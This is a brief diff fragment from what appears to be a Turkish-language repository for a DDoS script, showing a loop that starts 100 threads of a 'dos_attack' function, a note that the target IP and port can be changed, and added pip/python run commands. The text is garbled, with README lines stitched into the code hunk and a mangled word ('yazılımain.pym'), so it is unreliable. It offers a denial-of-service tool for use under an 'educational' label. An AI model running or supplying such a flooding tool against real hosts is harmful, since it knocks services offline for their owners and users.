@@ -19,5 +19,7 @@ def dos_attack():
 for i in range(100):
     thread = threading.Thread(target=dos_attack)
     thread.start()# ddos
-ddos saldırırsı eğitim amaçlı yazılım.
+ddos saldırırsı eğitim amaçlı yazılımain.pym.
 target ip yerini ve portu degiştirebilirsiniz.
+pip install -r requirements.txt 
+python main.py python3 main.py
